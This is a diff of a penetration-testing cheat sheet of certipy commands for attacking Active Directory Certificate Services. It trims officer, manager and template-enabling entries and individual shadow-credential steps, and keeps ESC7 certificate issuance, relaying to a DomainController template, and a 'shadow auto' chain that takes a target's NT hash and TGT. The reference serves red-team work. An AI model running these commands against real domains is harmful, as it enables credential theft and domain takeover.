@@ -56,25 +56,7 @@ certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certi
 certipy template <domain>/<user>:'<password>'@<ca-ip> -template <template> -save-old
 ```
 
-## certipy - give Manage Certificates access right to user
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -add-officer <targeted-user>
-```
-
-## certipy - give Manage CA access right to user
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -add-manager <targeted-user>
-```
-
-## certipy - Enable specific template
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -enable-template <template>
-```
-
-## certipy - Issue CSR for specific request id - ESC7
+## certipy - Issue certificate for specific request id - ESC7
 #plateform/linux #target/remote #cat/ATTACK
 ```
 certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -issue-request <csr-id>
@@ -92,32 +74,9 @@ certipy relay -ca <ca-ip>
 certipy relay -ca <ca-ip> -template 'DomainController'
 ```
 
-## certipy - Add Key Credential to a target - Shadow Credential
+## certipy - Get NT hash - Shadow Credential
 #plateform/linux #target/remote #cat/ATTACK
+Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
 ```
-certipy shadow add <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
-```
-
-## certipy - List Key Credentials for a target - Shadow Credential
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy shadow list <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
-```
-
-## certipy - Show information about a specific Key Credential for a target - Shadow Credential
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy shadow info <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user> -device-id <device-uuid>
-```
-
-## certipy - Remove a specific Key Credential for a target - Shadow Credential
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy shadow remove <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user> -device-id <device-uuid>
-```
-
-## certipy - Remove all of the Key Credentials for a target - Shadow Credential
-#plateform/linux #target/remote #cat/ATTACK
-```
-certipy shadow remove <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
+certipy shadow auto <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
 ```
